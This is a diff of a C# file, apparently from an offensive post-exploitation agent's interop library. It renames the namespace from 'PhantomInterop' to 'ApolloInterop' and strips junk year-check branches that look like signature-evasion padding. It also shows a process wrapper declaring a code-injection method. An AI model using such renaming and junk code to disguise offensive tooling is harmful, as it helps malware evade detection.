@@ -1,10 +1,10 @@
-﻿using PhantomInterop.Classes.Api;
-using PhantomInterop.Classes.Events;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.PhantomStructs;
+﻿using ApolloInterop.Classes.Api;
+using ApolloInterop.Classes.Events;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.ApolloStructs;
 using System;
 
-namespace PhantomInterop.Classes.Core
+namespace ApolloInterop.Classes.Core
 {
     public abstract class Process : IProcess
     {
@@ -69,16 +69,16 @@ namespace PhantomInterop.Classes.Core
 
             if (!HasExited)
             {
-                if(DateTime.Now.Year > 2020) { return null; } else { return null; }
+                return null;
             }
 
             var rtlNtStatusToDosError = _agent.GetApi().GetLibraryFunction<RtlNtStatusToDosError>(Library.NTDLL, "RtlNtStatusToDosError");
             if (rtlNtStatusToDosError == null)
             {
-                if(DateTime.Now.Year > 2020) { return null; } else { return null; }
+                return null;
             }
 
-            if(DateTime.Now.Year > 2020) { return unchecked((int)(rtlNtStatusToDosError(ExitCode) | HRESULT_MASK)); } else { return null; }
+            return unchecked((int)(rtlNtStatusToDosError(ExitCode) | HRESULT_MASK));
         }
 
         public abstract bool Inject(byte[] code, string arguments = "");
